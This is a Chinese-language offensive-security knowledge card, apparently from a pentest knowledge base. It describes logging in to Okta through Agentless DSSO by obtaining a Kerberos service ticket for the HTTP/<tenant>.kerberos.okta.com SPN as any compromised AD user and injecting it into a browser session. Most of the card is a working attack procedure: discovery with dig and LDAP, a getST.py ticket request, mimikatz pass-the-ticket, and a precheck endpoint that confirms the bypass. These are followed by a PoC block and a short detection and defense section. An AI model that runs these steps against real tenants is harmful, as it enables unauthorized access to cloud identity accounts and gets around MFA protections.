---
id: cloud-cloud-iam-okta-agentless-dsso-kerberos-tgs-login
title: Okta 委托认证（Agentless DSSO）：dig/LDAP 发现 Kerberos SPN，注入 AD 用户 TGS 直接登录 Okta 并绕过 MFA
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: okta-agentless-dsso-kerberos-tgs-login
aliases:
- Okta 委托认证
- Agentless DSSO
- kerberos.okta.com
- getST.py Okta
- Kerberos 票据登录 Okta
- Okta MFA 绕过
tags:
- okta
- cloud-iam
- identity-provider
- kerberos
- tgs
- sso
- mfa-bypass
- active-directory
- hybrid-identity
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V433
  verified_at: '2026-11-09T20:12:53+08:00'
  notes: 已对照原文与22张截图核对：dig 返回一对 A 记录、LDAP 查 HTTP/<tenant>.kerberos.okta.com SPN 得 Okta Deleg 账户、getST 取 TGS + mimikatz ptt、加入 Intranet 区后 agentlessDssoPrecheck 返回 {"result":"OK"}、UserHome 仪表盘登录；AES 仅支持与免 MFA 说法与图文一致。未验证点：不同租户的票据/浏览器配置需按环境调整。
---

## 一句话结论

当 Okta 租户启用了委托认证（Agentless DSSO）时，任意被控 AD 用户都能向 KDC 申请 `HTTP/<tenant>.kerberos.okta.com` 的服务票据（TGS），把票据注入浏览器后 Okta 直接承认该 Kerberos 身份并建立会话，通常不再要求 MFA；发现方法是 `dig <tenant>.kerberos.okta.com` 或用 LDAP 查对应 SPN。

## 原理

- 委托认证把 Okta 与本地 AD 集成：Okta 在 AD 中创建一个专用代理账户，其 SPN 为 `HTTP/<tenant>.kerberos.okta.com`，Okta 侧保存该账户密钥用于验证 Kerberos 票据。租户启用后，`<tenant>.kerberos.okta.com` 会有 DNS A 记录。
- 任意域用户都能为自己的身份申请该 SPN 的服务票据；票据用 Okta 代理账户的密钥加密，Okta 用自己保存的同一密钥解密并校验 PAC 中的用户身份，随后建立 Okta 会话。因此攻击者不需要 Okta 任何凭据，只需要一个普通 AD 账户。
- 浏览器只有把站点判定为“本地 Intranet”安全区域时才会自动执行 Kerberos/SPNEGO 认证。把 `<tenant>.kerberos.okta.com` 加入 Intranet 区后访问 `agentlessDssoPrecheck`，若返回 `{"result":"OK"}` 即说明票据被接受。
- 委托认证的断言被视为强身份，Okta 通常不再要求 MFA（票据绑定的是域内身份），这就是“拿到 AD 用户即进入 Okta 且免二次验证”的原因。
- 前提与限制：租户确实启用了委托认证；攻击者持有可用 AD 账户（口令或 hash）；票据必须为 AES 加密——Okta 只支持 AES，RC4 票据不被接受。

## 触发条件

- Okta 租户启用了 Delegated Authentication / Agentless DSSO，且存在 `HTTP/<tenant>.kerberos.okta.com` 的 SPN 与 DNS 记录。
- 攻击者已控制任意一个 AD 域账户（低权限即可），能向 KDC 申请服务票据。
- 攻击者能把目标域加入浏览器 Intranet 安全区域（或使用支持 SPNEGO 的客户端）。
- 账号与服务支持 AES128/256（现代域环境默认满足）。

## 利用步骤

1. 发现：`dig <tenant>.kerberos.okta.com` 返回一对 A 记录即表示启用；或 LDAP 查询 `(servicePrincipalName=HTTP/<tenant>.kerberos.okta.com)`，返回的专用账户即是 Okta 代理账户。
2. 申请 TGS：`getST.py -spn HTTP/<tenant>.kerberos.okta.com -dc-ip <DC_IP> <DOMAIN>/<被控用户>`，得到该用户的 `.ccache`。
3. 注入票据：在受控主机上用 Rubeus `ptt` 或 mimikatz `kerberos::ptt <ticket>`（先 `kerberos::purge` 清理旧票据）。
4. 浏览器设置：把 `<tenant>.kerberos.okta.com` 加入 Internet 选项的本地 Intranet 区域；访问 `https://<tenant>.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck`，看到 `{"result":"OK"}`。
5. 打开 `https://<tenant>.okta.com/app/UserHome`，仪表盘会显示已通过 Kerberos 登录；访问受保护应用一般不会弹 MFA。

## PoC

```bash
# 1) 发现委托认证
dig <tenant>.kerberos.okta.com

# 2) 以被控 AD 用户申请 Okta SPN 的 TGS
getST.py -spn HTTP/<tenant>.kerberos.okta.com -dc-ip <DC_IP> <DOMAIN>/<user>

# 3) 注入票据
# mimikatz: kerberos::purge ; kerberos::ptt <user>.ccache

# 4) 验证（浏览器 Intranet 区已加入 kerberos.okta.com）
# GET https://<tenant>.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck
# -> {"result":"OK"}
```

## 变体与关联

- 关联 [[cloud-cloud-iam-okta-delegated-auth-silver-ticket-aes-any-user]]：若进一步拿下该代理账户的 AES 密钥，可为任意用户伪造 TGS，而不再局限于自己的 AD 身份。
- 关联 [[pentest-ad-silver-ticket-service-hash-forge-tgs]]：白银票据的通用原理；本卡是其在云 IdP 上的“合法票据注入”版本（不改 PAC）。
- 边界：未启用委托认证时 DNS/SPN 均不存在；Okta 拒绝非 AES 票据；浏览器不在 Intranet 区时不会自动发送票据，需要手工配置或改用支持 Negotiate 的客户端。

## 检测与防御

- 域内检测：监控对 `HTTP/<tenant>.kerberos.okta.com` 的 TGS 请求（4769），普通用户/异常主机申请该 SPN、或出现非预期 AES 票据时告警。
- Okta 侧：审计 Delegated Authentication 的启用与使用；即使启用也强制 MFA/设备条件访问；限制 Intranet 区自动登录策略。
- 防御：非必要不启用委托认证；启用时约束代理账户权限、轮换其密钥、限制 SPN 暴露面，并对 Kerberos 登录来源做基线监控。
